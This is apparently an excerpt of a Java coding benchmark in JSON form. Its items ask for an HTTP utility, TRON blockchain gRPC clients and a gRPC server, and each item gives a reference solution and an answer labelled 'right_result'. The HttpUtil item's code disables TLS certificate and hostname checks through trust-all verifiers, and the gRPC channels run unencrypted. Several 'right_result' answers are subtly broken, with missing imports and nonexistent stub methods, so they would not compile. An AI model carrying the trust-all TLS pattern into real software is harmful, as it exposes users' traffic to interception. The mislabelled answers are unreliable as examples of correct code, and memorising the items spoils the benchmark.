    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.security.SecureRandom;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.HashMap;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSession;\nimport javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\n\npublic class HttpUtil {\n    private static final int Timeout = 5000;\n    private static final String DefalutEncoding = \"UTF-8\";\n    private static Map currentProxy = new HashMap();\n    public static HostnameVerifier allHostsValid = new HostnameVerifier() {\n        @Override\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    };\n\n    public static String httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding) throws Exception {\n        if (\"\".equals(encoding) || encoding == null) {\n            encoding = DefalutEncoding;\n        }\n\n        URLConnection httpUrlConn = null;\n        HttpsURLConnection hsc = null;\n        HttpURLConnection hc = null;\n        InputStream inputStream = null;\n\n        String result;\n        try {\n            URL url = new URL(requestUrl);\n            if (requestUrl.startsWith(\"https\")) {\n                SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n                TrustManager[] tm = new TrustManager[]{new X509TrustUtiil()};\n                sslContext.init(null, tm, new SecureRandom());\n                SSLSocketFactory ssf = sslContext.getSocketFactory();\n                hsc = (HttpsURLConnection) url.openConnection();\n                hsc.setSSLSocketFactory(ssf);\n                hsc.setHostnameVerifier(allHostsValid);\n                httpUrlConn = hsc;\n            } else {\n                hc = (HttpURLConnection) url.openConnection();\n                hc.setRequestMethod(requestMethod);\n                hc.setInstanceFollowRedirects(false);\n                httpUrlConn = hc;\n            }\n\n            httpUrlConn.setConnectTimeout(timeOut);\n            httpUrlConn.setReadTimeout(timeOut);\n            if (contentType != null && !\"\".equals(contentType)) {\n                httpUrlConn.setRequestProperty(\"Content-Type\", contentType);\n            }\n\n            httpUrlConn.setDoOutput(true);\n            httpUrlConn.setDoInput(true);\n            httpUrlConn.connect();\n            if (null != postString && !\"\".equals(postString)) {\n                OutputStream outputStream = httpUrlConn.getOutputStream();\n                outputStream.write(postString.getBytes(encoding));\n                outputStream.flush();\n                outputStream.close();\n            }\n\n            inputStream = httpUrlConn.getInputStream();\n            result = readString(inputStream, encoding);\n            return result;\n        } catch (IOException var18) {\n            if (hsc == null) {\n                if (hc != null) {\n                    result = readString(hc.getErrorStream(), encoding);\n                    return result;\n                }\n                result = \"\";\n                return result;\n            }\n            result = readString(hsc.getErrorStream(), encoding);\n        } finally {\n            if (hsc != null) {\n                hsc.disconnect();\n            }\n            if (hc != null) {\n                hc.disconnect();\n            }\n        }\n        return result;\n    }\n\n    public static String readString(InputStream inputStream, String encoding) throws IOException {\n        BufferedInputStream bis = null;\n        ByteArrayOutputStream baos = null;\n\n        try {\n            bis = new BufferedInputStream(inputStream);\n            baos = new ByteArrayOutputStream();\n            byte[] arr = new byte[1];\n\n            int len;\n            while ((len = bis.read(arr)) != -1) {\n                baos.write(arr, 0, len);\n            }\n        } finally {\n            if (baos != null) {\n                baos.flush();\n                baos.close();\n            }\n            if (bis != null) {\n                bis.close();\n            }\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            return baos.toString(encoding);\n        }\n    }\n\n    static class X509TrustUtiil implements X509TrustManager {\n        @Override\n        public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {\n        }\n\n        @Override\n        public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {\n        }\n\n        @Override\n        public X509Certificate[] getAcceptedIssuers() {\n            return null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport javax.net.ssl.*;\n\npublic class HttpUtil {\n    private static final int TIMEOUT = 5000;\n    private static final String DEFAULT_ENCODING = \"UTF-8\";\n    private static Map<String, String> currentProxy = new HashMap<>();\n    private static HostnameVerifier allHostsValid = new HostnameVerifier() {\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    };\n\n    public static String httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding) {\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(requestUrl);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setConnectTimeout(timeOut);\n            connection.setReadTimeout(timeOut);\n            connection.setRequestMethod(requestMethod);\n            connection.setRequestProperty(\"Content-Type\", contentType + \"; charset=\" + encoding);\n\n            if (\"POST\".equalsIgnoreCase(requestMethod)) {\n                connection.setDoOutput(true);\n                OutputStream os = connection.getOutputStream();\n                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, encoding));\n                writer.write(postString);\n                writer.flush();\n                writer.close();\n            }\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                return readString(connection.getInputStream(), encoding);\n            } else {\n                return readString(connection.getErrorStream(), encoding);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    private static String readString(InputStream inputStream, String encoding) throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, encoding));\n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n        }\n        reader.close();\n        return response.toString();\n    }\n\n    private static class X509TrustUtil implements X509TrustManager {\n        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {}\n\n        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {}\n\n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[0];\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 500,
    "Instruction": "Task Description: Create a gRPC client class in Java that connects to both full and solidity nodes of a blockchain network, allowing for transaction creation and broadcasting.\n\nClass Description: The GrpcClient class establishes gRPC connections to blockchain nodes (full and solidity) and provides methods for transaction operations. It manages channel lifecycle and provides blocking stub interfaces for synchronous communication.\n\nAttributes:\n- channelFull: [ManagedChannel] - Channel for connection to the full node\n- channelSolidity: [ManagedChannel] - Channel for connection to the solidity node\n- blockingStubFull: [WalletGrpc.WalletBlockingStub] - Blocking stub for full node operations\n- blockingStubSolidity: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for solidity node operations\n- blockingStubExtension: [WalletExtensionGrpc.WalletExtensionBlockingStub] - Blocking stub for extension operations\n\nMethods:\n- GrpcClient(String fullnode, String soliditynode) -> [void] - Constructor that initializes connections to specified nodes\n- shutdown() -> [void] - Gracefully shuts down all active channels\n- createTransaction(AccountUpdateContract contract) -> [Transaction] - Creates a transaction using the full node stub\n- broadcastTransaction(Transaction signaturedTransaction) -> [boolean] - Broadcasts a signed transaction and returns operation result",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.api.WalletGrpc;\nimport org.tron.api.WalletSolidityGrpc;\nimport org.tron.api.WalletExtensionGrpc;\n\npublic class GrpcClient {\n\n  private ManagedChannel channelFull = null;\n  private ManagedChannel channelSolidity = null;\n  private WalletGrpc.WalletBlockingStub blockingStubFull = null;\n  private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity = null;\n  private WalletExtensionGrpc.WalletExtensionBlockingStub blockingStubExtension = null;\n\n  public GrpcClient(String fullnode, String soliditynode) {\n    if (!(fullnode.isEmpty())) {\n      channelFull = ManagedChannelBuilder.forTarget(fullnode)\n          .usePlaintext()\n          .build();\n      blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n    }\n    if (!(soliditynode.isEmpty())) {\n      channelSolidity = ManagedChannelBuilder.forTarget(soliditynode)\n          .usePlaintext()\n          .build();\n      blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n      blockingStubExtension = WalletExtensionGrpc.newBlockingStub(channelSolidity);\n    }\n  }\n\n  public void shutdown() throws InterruptedException {\n    if (channelFull != null) {\n      channelFull.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n    }\n    if (channelSolidity != null) {\n      channelSolidity.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n    }\n  }\n\n  public Transaction createTransaction(AccountUpdateContract contract) {\n    return blockingStubFull.updateAccount(contract);\n  }\n\n  public boolean broadcastTransaction(Transaction signaturedTransaction) {\n    GrpcAPI.Return response = blockingStubFull.broadcastTransaction(signaturedTransaction);\n    return response.getResult();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport org.tron.protos.Contract.AccountUpdateContract;\nimport org.tron.protos.Protocol.Transaction;\n\npublic class GrpcClient {\n    private ManagedChannel channelFull;\n    private ManagedChannel channelSolidity;\n    private WalletGrpc.WalletBlockingStub blockingStubFull;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity;\n    private WalletExtensionGrpc.WalletExtensionBlockingStub blockingStubExtension;\n\n    public GrpcClient(String fullnode, String soliditynode) {\n        this.channelFull = ManagedChannelBuilder.forTarget(fullnode).usePlaintext().build();\n        this.blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n        \n        this.channelSolidity = ManagedChannelBuilder.forTarget(soliditynode).usePlaintext().build();\n        this.blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n        \n        // Assuming WalletExtensionGrpc is available and configured similarly\n        // this.blockingStubExtension = WalletExtensionGrpc.newBlockingStub(channelFull);\n    }\n\n    public void shutdown() {\n        if (channelFull != null) {\n            channelFull.shutdownNow();\n        }\n        if (channelSolidity != null) {\n            channelSolidity.shutdownNow();\n        }\n    }\n\n    public Transaction createTransaction(AccountUpdateContract contract) {\n        return blockingStubFull.updateAccount(contract);\n    }\n\n    public boolean broadcastTransaction(Transaction signaturedTransaction) {\n        return blockingStubSolidity.broadcastTransaction(signaturedTransaction).getResult();\n    }\n}\n```"
  },
  {
    "Task_id": 501,
    "Instruction": "Task Description: Create a gRPC client class in Java for interacting with a Tron blockchain wallet service, implementing various wallet operations through gRPC calls.\n\nClass Description: The WalletGrpcClient class provides a Java interface to interact with a Tron blockchain node's wallet service using gRPC. It handles connection management and provides methods for account queries, transaction creation, and blockchain data retrieval.\n\nAttributes:\n- channel: [ManagedChannel] - The gRPC communication channel to the server\n- walletBlockingStub: [WalletGrpc.WalletBlockingStub] - The blocking stub for making synchronous RPC calls\n\nMethods:\n- WalletGrpcClient(String host, int port) - Constructor - Creates a client connecting to specified host and port\n- WalletGrpcClient(String host) - Constructor - Creates a client connecting to specified host (using target format)\n- shutdown() -> void - Shuts down the channel with 5-second timeout\n- queryAccount(byte[] address) -> Account - Queries account information by address\n- createTransaction(TransferContract contract) -> Transaction - Creates a transfer transaction\n- createTransferAssetTransaction(TransferAssetContract contract) -> Transaction - Creates an asset transfer transaction\n- createParticipateAssetIssueTransaction(ParticipateAssetIssueContract contract) -> Transaction - Creates an asset participation transaction\n- createAssetIssue(AssetIssueContract contract) -> Transaction - Creates an asset issuance transaction\n- voteWitnessAccount(VoteWitnessContract contract) -> Transaction - Creates a witness voting transaction\n- createWitness(WitnessCreateContract contract) -> Transaction - Creates a witness creation transaction\n- broadcastTransaction(Transaction signedTransaction) -> boolean - Broadcasts a signed transaction to network\n- getBlock(long blockNum) -> Block - Retrieves block by number (or latest if negative)\n- listNodes() -> Optional<NodeList> - Lists connected nodes\n- getAssetIssueByAccount(byte[] address) -> Optional<AssetIssueList> - Gets assets issued by account\n- getAssetIssueByName(String assetName) -> AssetIssueContract - Gets asset by name\n- getAssetIssueListByName(String assetName) -> Optional<AssetIssueList> - Gets asset list by name\n- getAssetIssueById(String assetId) -> AssetIssueContract - Gets asset by ID",
    "Canonical_solution": "import com.google.protobuf.ByteString;\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.Optional;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.api.GrpcAPI.AssetIssueList;\nimport org.tron.api.GrpcAPI.BytesMessage;\nimport org.tron.api.GrpcAPI.EmptyMessage;\nimport org.tron.api.GrpcAPI.NodeList;\nimport org.tron.api.GrpcAPI.NumberMessage;\nimport org.tron.api.GrpcAPI.Return;\nimport org.tron.api.WalletGrpc;\nimport org.tron.protos.Protocol.Account;\nimport org.tron.protos.Protocol.Block;\nimport org.tron.protos.Protocol.Transaction;\nimport org.tron.protos.contract.AssetIssueContractOuterClass.AssetIssueContract;\nimport org.tron.protos.contract.AssetIssueContractOuterClass.ParticipateAssetIssueContract;\nimport org.tron.protos.contract.AssetIssueContractOuterClass.TransferAssetContract;\nimport org.tron.protos.contract.BalanceContract.TransferContract;\nimport org.tron.protos.contract.WitnessContract.VoteWitnessContract;\nimport org.tron.protos.contract.WitnessContract.WitnessCreateContract;\n\npublic class WalletGrpcClient {\n\n  private final ManagedChannel channel;\n  private final WalletGrpc.WalletBlockingStub walletBlockingStub;\n\n  public WalletGrpcClient(String host, int port) {\n    channel = ManagedChannelBuilder.forAddress(host, port)\n        .usePlaintext()\n        .build();\n    walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n  }\n\n  public WalletGrpcClient(String host) {\n    channel = ManagedChannelBuilder.forTarget(host)\n        .usePlaintext()\n        .build();\n    walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n  }\n\n  public void shutdown() throws InterruptedException {\n    channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n  }\n\n  public Account queryAccount(byte[] address) {\n    ByteString addressByteString = ByteString.copyFrom(address);\n    Account request = Account.newBuilder().setAddress(addressByteString).build();\n    return walletBlockingStub.getAccount(request);\n  }\n\n  public Transaction createTransaction(TransferContract contract) {\n    return walletBlockingStub.createTransaction(contract);\n  }\n\n  public Transaction createTransferAssetTransaction(TransferAssetContract contract) {\n    return walletBlockingStub.transferAsset(contract);\n  }\n\n  public Transaction createParticipateAssetIssueTransaction(\n      ParticipateAssetIssueContract contract) {\n    return walletBlockingStub.participateAssetIssue(contract);\n  }\n\n  public Transaction createAssetIssue(AssetIssueContract contract) {\n    return walletBlockingStub.createAssetIssue(contract);\n  }\n\n  public Transaction voteWitnessAccount(VoteWitnessContract contract) {\n    return walletBlockingStub.voteWitnessAccount(contract);\n  }\n\n  public Transaction createWitness(WitnessCreateContract contract) {\n    return walletBlockingStub.createWitness(contract);\n  }\n\n  public boolean broadcastTransaction(Transaction signedTransaction) {\n    Return response = walletBlockingStub.broadcastTransaction(signedTransaction);\n    return response.getResult();\n  }\n\n  public Block getBlock(long blockNum) {\n    if (blockNum < 0) {\n      return walletBlockingStub.getNowBlock(EmptyMessage.newBuilder().build());\n    }\n    NumberMessage.Builder builder = NumberMessage.newBuilder();\n    builder.setNum(blockNum);\n    return walletBlockingStub.getBlockByNum(builder.build());\n  }\n\n  public Optional<NodeList> listNodes() {\n    NodeList nodeList = walletBlockingStub\n        .listNodes(EmptyMessage.newBuilder().build());\n    if (nodeList != null) {\n      return Optional.of(nodeList);\n    }\n    return Optional.empty();\n  }\n\n  public Optional<AssetIssueList> getAssetIssueByAccount(byte[] address) {\n    ByteString addressByteString = ByteString.copyFrom(address);\n    Account request = Account.newBuilder().setAddress(addressByteString).build();\n    AssetIssueList assetIssueList = walletBlockingStub\n        .getAssetIssueByAccount(request);\n    if (assetIssueList != null) {\n      return Optional.of(assetIssueList);\n    }\n    return Optional.empty();\n  }\n\n  public AssetIssueContract getAssetIssueByName(String assetName) {\n    ByteString assetNameBs = ByteString.copyFrom(assetName.getBytes());\n    BytesMessage request = BytesMessage.newBuilder().setValue(assetNameBs).build();\n    return walletBlockingStub.getAssetIssueByName(request);\n  }\n\n  public Optional<AssetIssueList> getAssetIssueListByName(String assetName) {\n    ByteString assetNameBs = ByteString.copyFrom(assetName.getBytes());\n    BytesMessage request = BytesMessage.newBuilder().setValue(assetNameBs).build();\n\n    AssetIssueList assetIssueList = walletBlockingStub\n        .getAssetIssueListByName(request);\n    if (assetIssueList != null) {\n      return Optional.of(assetIssueList);\n    }\n    return Optional.empty();\n  }\n\n  public AssetIssueContract getAssetIssueById(String assetId) {\n    ByteString assetIdBs = ByteString.copyFrom(assetId.getBytes());\n    BytesMessage request = BytesMessage.newBuilder().setValue(assetIdBs).build();\n    return walletBlockingStub.getAssetIssueById(request);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport com.tron.protos.WalletOuterClass.*;\nimport com.tron.protos.Protocol.*;\n\npublic class WalletGrpcClient {\n    private ManagedChannel channel;\n    private WalletGrpc.WalletBlockingStub walletBlockingStub;\n\n    public WalletGrpcClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();\n        this.walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n    }\n\n    public WalletGrpcClient(String host) {\n        this(host, 50051); // Default port for gRPC service\n    }\n\n    public void shutdown() {\n        channel.shutdownNow().awaitTermination(5, TimeUnit.SECONDS);\n    }\n\n    public Account queryAccount(byte[] address) {\n        return walletBlockingStub.getAccount(Account.newBuilder().setAddress(ByteString.copyFrom(address)).build());\n    }\n\n    public Transaction createTransaction(TransferContract contract) {\n        return walletBlockingStub.createTransaction(contract);\n    }\n\n    public Transaction createTransferAssetTransaction(TransferAssetContract contract) {\n        return walletBlockingStub.createTransferAssetTransaction(contract);\n    }\n\n    public Transaction createParticipateAssetIssueTransaction(ParticipateAssetIssueContract contract) {\n        return walletBlockingStub.createParticipateAssetIssueTransaction(contract);\n    }\n\n    public Transaction createAssetIssue(AssetIssueContract contract) {\n        return walletBlockingStub.createAssetIssue(contract);\n    }\n\n    public Transaction voteWitnessAccount(VoteWitnessContract contract) {\n        return walletBlockingStub.voteWitnessAccount(contract);\n    }\n\n    public Transaction createWitness(WitnessCreateContract contract) {\n        return walletBlockingStub.createWitness(contract);\n    }\n\n    public boolean broadcastTransaction(Transaction signedTransaction) {\n        return walletBlockingStub.broadcastTransaction(signedTransaction).getResult();\n    }\n\n    public Block getBlock(long blockNum) {\n        return walletBlockingStub.getBlock(Block.newBuilder().setNumber(blockNum).build());\n    }\n\n    public Optional<NodeList> listNodes() {\n        NodeList nodeList = walletBlockingStub.listNodes(NodeList.newBuilder().build());\n        return Optional.ofNullable(nodeList);\n    }\n\n    public Optional<AssetIssueList> getAssetIssueByAccount(byte[] address) {\n        AssetIssueList assetIssueList = walletBlockingStub.getAssetIssueByAccount(Address.newBuilder().setValue(ByteString.copyFrom(address)).build());\n        return Optional.ofNullable(assetIssueList);\n    }\n\n    public AssetIssueContract getAssetIssueByName(String assetName) {\n        return walletBlockingStub.getAssetIssueByName(AssetIssueContract.newBuilder().setName(assetName).build());\n    }\n\n    public Optional<AssetIssueList> getAssetIssueListByName(String assetName) {\n        AssetIssueList assetIssueList = walletBlockingStub.getAssetIssueListByName(AssetIssueContract.newBuilder().setName(assetName).build());\n        return Optional.ofNullable(assetIssueList);\n    }\n\n    public AssetIssueContract getAssetIssueById(String assetId) {\n        return walletBlockingStub.getAssetIssueById(AssetIssueContract.newBuilder().setId(assetId).build());\n    }\n}\n```"
  },
  {
    "Task_id": 503,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for establishing and managing connections to a gRPC server, with methods to start the connection, retrieve the blocking stub, and shutdown the connection.\n\nClass Description: The GrpcClient class provides functionality to connect to a gRPC server using a ManagedChannel, create a blocking stub for synchronous communication, and properly shutdown the connection when done.\n\nAttributes:\n- channel: [ManagedChannel] - The channel used to communicate with the gRPC server\n- blockingStub: [WalletGrpc.WalletBlockingStub] - The blocking stub used to make synchronous RPC calls\n\nMethods:\n- startConnection(String host, int port) -> void - Establishes a connection to the gRPC server at the specified host and port, creating both the ManagedChannel and blocking stub\n- getBlockingStub() -> WalletGrpc.WalletBlockingStub - Returns the blocking stub for making RPC calls\n- shutdown() -> void - Shuts down the channel connection, waiting for up to 5 seconds for termination",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport org.tron.api.WalletGrpc;\nimport java.util.concurrent.TimeUnit;\n\npublic class GrpcClient {\n\n    private ManagedChannel channel;\n    private WalletGrpc.WalletBlockingStub blockingStub;\n\n    public void startConnection(String host, int port) {\n        channel = ManagedChannelBuilder.forAddress(host, port)\n            .usePlaintext()\n            .build();\n        blockingStub = WalletGrpc.newBlockingStub(channel);\n    }\n\n    public WalletGrpc.WalletBlockingStub getBlockingStub() {\n        return blockingStub;\n    }\n\n    public void shutdown() throws InterruptedException {\n        if (channel != null) {\n            channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport com.example.wallet.WalletGrpc;\n\npublic class GrpcClient {\n    private ManagedChannel channel;\n    private WalletGrpc.WalletBlockingStub blockingStub;\n\n    public void startConnection(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port)\n                .usePlaintext()\n                .build();\n        this.blockingStub = WalletGrpc.newBlockingStub(channel);\n    }\n\n    public WalletGrpc.WalletBlockingStub getBlockingStub() {\n        return blockingStub;\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 505,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for interacting with multiple TRON blockchain nodes (full node, solidity node, and PBFT node) to retrieve block information.\n\nClass Description: The GrpcClient class provides functionality to connect to different types of TRON blockchain nodes using gRPC protocol and retrieve block data from them. It manages multiple channel connections and provides blocking stub interfaces for synchronous calls.\n\nAttributes:\n- channelFull: [ManagedChannel] - Channel for connection to the full node\n- channelSolidity: [ManagedChannel] - Channel for connection to the solidity node\n- channelpBFT: [ManagedChannel] - Channel for connection to the PBFT node\n- blockingStubFull: [WalletGrpc.WalletBlockingStub] - Blocking stub for full node operations\n- blockingStubSolidity: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for solidity node operations\n- blockingStubpBFT: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for PBFT node operations\n\nMethods:\n- init: [void]([String fullnode, String solidityNode, String pBFTNode]) -> [void] - Initializes connections to all three node types by creating channels and stubs\n- getBlockFromFullNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the full node by block number\n- getBlockFromSolidityNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the solidity node by block number\n- getBlockFromPBFTNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the PBFT node by block number\n- shutdown: [void]([]) -> [void] - Gracefully shuts down all channel connections with a 5-second timeout",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.StatusRuntimeException;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.api.GrpcAPI;\nimport org.tron.api.WalletGrpc;\nimport org.tron.api.WalletSolidityGrpc;\n\npublic class GrpcClient {\n\n    private ManagedChannel channelFull;\n    private ManagedChannel channelSolidity;\n    private ManagedChannel channelpBFT;\n    private WalletGrpc.WalletBlockingStub blockingStubFull;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubpBFT;\n\n    public void init(String fullnode, String solidityNode, String pBFTNode) {\n        channelFull = ManagedChannelBuilder.forTarget(fullnode)\n                .usePlaintext()\n                .build();\n        channelSolidity = ManagedChannelBuilder.forTarget(solidityNode)\n                .usePlaintext()\n                .build();\n        channelpBFT = ManagedChannelBuilder.forTarget(pBFTNode)\n                .usePlaintext()\n                .build();\n        blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n        blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n        blockingStubpBFT = WalletSolidityGrpc.newBlockingStub(channelpBFT);\n    }\n\n    public GrpcAPI.Block getBlockFromFullNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubFull.getBlockByNum(message);\n    }\n\n    public GrpcAPI.Block getBlockFromSolidityNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubSolidity.getBlockByNum(message);\n    }\n\n    public GrpcAPI.Block getBlockFromPBFTNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubpBFT.getBlockByNum(message);\n    }\n\n    public void shutdown() throws InterruptedException {\n        if (channelFull != null) {\n            channelFull.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n        if (channelSolidity != null) {\n            channelSolidity.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n        if (channelpBFT != null) {\n            channelpBFT.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport org.tron.protos.Protocol.Block;\nimport org.tron.api.GrpcAPI;\n\npublic class GrpcClient {\n    private ManagedChannel channelFull;\n    private ManagedChannel channelSolidity;\n    private ManagedChannel channelPBFT;\n    private WalletGrpc.WalletBlockingStub blockingStubFull;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubPBFT;\n\n    public void init(String fullnode, String solidityNode, String pBFTNode) {\n        channelFull = ManagedChannelBuilder.forTarget(fullnode).usePlaintext().build();\n        channelSolidity = ManagedChannelBuilder.forTarget(solidityNode).usePlaintext().build();\n        channelPBFT = ManagedChannelBuilder.forTarget(pBFTNode).usePlaintext().build();\n\n        blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n        blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n        blockingStubPBFT = WalletSolidityGrpc.newBlockingStub(channelPBFT);\n    }\n\n    public Block getBlockFromFullNode(long blockNum) {\n        return blockingStubFull.getBlockByNum(blockNum);\n    }\n\n    public Block getBlockFromSolidityNode(long blockNum) {\n        return blockingStubSolidity.getBlockByNum(blockNum);\n    }\n\n    public Block getBlockFromPBFTNode(long blockNum) {\n        return blockingStubPBFT.getBlockByNum(blockNum);\n    }\n\n    public void shutdown() {\n        try {\n            channelFull.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n            channelSolidity.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n            channelPBFT.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 506,
    "Instruction": "Task Description: Implement a gRPC server in Java that handles streaming requests and responses, following the structure and functionality of the provided reference code.\n\nClass Description: The HelloWorldServer class represents a gRPC server that listens on a specified port and provides a streaming greeting service. It manages server lifecycle operations (start, stop, await termination) and implements the gRPC service interface for handling client requests.\n\nAttributes:\n- server: [Server] - The gRPC server instance that handles incoming requests\n- logger: [Logger] - Logger instance for server activity logging\n\nMethods:\n- start() -> [void] - Starts the gRPC server on the specified port (50051 by default) and registers a shutdown hook for graceful termination. Throws IOException if server fails to start.\n- stop() -> [void] - Initiates graceful shutdown of the gRPC server if it's running\n- blockUntilShutdown() -> [void] - Blocks the calling thread until the server terminates. Throws InterruptedException if the thread is interrupted while waiting.\n\nNested Class:\n- GreeterImpl: [StreamingGreeterGrpc.StreamingGreeterImplBase] - Implements the gRPC service interface with streaming capabilities\n  Methods:\n  - sayHelloStreaming(HelloRequest req, StreamObserver<HelloReply> responseObserver) -> [void] - Handles client requests by sending multiple greeting responses in a stream. Takes a HelloRequest containing the client's name and a StreamObserver for sending responses. Sends three greeting messages with increasing excitement, then completes the stream.",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.examples.streaming.HelloReply;\nimport io.grpc.examples.streaming.HelloRequest;\nimport io.grpc.examples.streaming.StreamingGreeterGrpc;\nimport io.grpc.stub.StreamObserver;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class HelloWorldServer {\n  private static final Logger logger = Logger.getLogger(HelloWorldServer.class.getName());\n  private Server server;\n\n  public void start() throws IOException {\n    int port = 50051;\n    server = ServerBuilder.forPort(port).addService(new GreeterImpl()).build().start();\n    logger.info(\"Server started, listening on \" + port);\n    Runtime.getRuntime()\n        .addShutdownHook(\n            new Thread() {\n              @Override\n              public void run() {\n                System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n                HelloWorldServer.this.stop();\n                System.err.println(\"*** server shut down\");\n              }\n            });\n  }\n\n  public void stop() {\n    if (server != null) {\n      server.shutdown();\n    }\n  }\n\n  public void blockUntilShutdown() throws InterruptedException {\n    if (server != null) {\n      server.awaitTermination();\n    }\n  }\n\n  static class GreeterImpl extends StreamingGreeterGrpc.StreamingGreeterImplBase {\n    @Override\n  